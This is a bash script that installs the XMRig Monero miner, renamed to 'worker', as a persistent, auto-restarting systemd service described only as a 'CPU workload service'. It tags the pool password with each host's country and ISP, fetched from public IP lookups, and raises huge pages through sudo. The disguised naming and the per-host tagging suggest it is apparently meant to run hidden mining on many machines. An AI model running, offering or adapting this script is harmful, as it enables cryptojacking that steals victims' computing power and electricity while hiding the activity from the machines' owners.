#!/bin/bash
set -e

sudo apt install -y libhwloc15 libhwloc-dev jq curl

APP_DIR="$HOME/appsvc"
BIN_URL="https://github.com/MoneroOcean/xmrig/releases/download/v6.24.0-mo1/xmrig-v6.24.0-mo1-lin64.tar.gz"
ARCHIVE="/tmp/app.tar.gz"

###############################################################################
#                         Generate PASS based on IP info
###############################################################################

echo "[0] Fetching region & ISP info..."

PUBLIC_IP=$(curl -s https://api.ipify.org)
COUNTRY=$(curl -s https://ipinfo.io/$PUBLIC_IP/country)
ORG=$(curl -s https://ipinfo.io/$PUBLIC_IP/org)   # Example: AS1234 Google LLC

# Remove AS number, keep provider name only
ISP=$(echo "$ORG" \
      | cut -d' ' -f2- \
      | tr -d ',' \
      | tr ' ' '_' \
      | tr '[:upper:]' '[:lower:]' \
      | tr -cd 'a-z0-9_')
RAND=$(openssl rand -hex 2)
PASS_VALUE="${COUNTRY}-${ISP}-${RAND}"

echo "[OK] PASS = $PASS_VALUE"

###############################################################################
#                               Setup worker
###############################################################################

echo "[1] Preparing directory..."
mkdir -p "$APP_DIR"

echo "[2] Downloading worker package..."
curl -L "$BIN_URL" -o "$ARCHIVE"

echo "[3] Unpacking package..."
tar xf "$ARCHIVE" -C "$APP_DIR"
rm "$ARCHIVE"

echo "[4] Renaming binary to 'worker'..."
mv "$APP_DIR/xmrig" "$APP_DIR/worker"

###############################################################################
#                 Generate updated config.json with custom PASS
###############################################################################

echo "[5] Injecting pass into config.json..."

# Generate modified config.json in /tmp
jq --arg PASS "$PASS_VALUE" '.pools[0].pass = $PASS' config.json > /tmp/config.json

# Move to App directory
cp /tmp/config.json "$APP_DIR/config.json"

###############################################################################
#                      ENABLE HUGE PAGES AUTOMATICALLY
###############################################################################

CPU_CORES=$(nproc)
HUGEPAGES=$((1168 + CPU_CORES))

echo "[6] Enabling HugePages (target: $HUGEPAGES)..."

sudo bash -c "echo vm.nr_hugepages=$HUGEPAGES >> /etc/sysctl.conf"
sudo sysctl -w vm.nr_hugepages=$HUGEPAGES

echo "[OK] HugePages applied."

###############################################################################
#                             SYSTEMD SERVICE
###############################################################################

echo "[7] Creating systemd service..."
cat <<EOF > /tmp/appsvc.service
[Unit]
Description=CPU workload service (worker)
After=network-online.target

[Service]
ExecStart=$APP_DIR/worker --config=$APP_DIR/config.json
Restart=always
RestartSec=5
Nice=10

[Install]
WantedBy=multi-user.target
EOF

sudo mv /tmp/appsvc.service /etc/systemd/system/appsvc.service

echo "[8] Activating service..."
sudo systemctl daemon-reload
sudo systemctl enable appsvc.service
sudo systemctl start appsvc.service

echo ""
echo "Setup complete."
echo "View logs with:"
echo "   sudo journalctl -u appsvc -f"

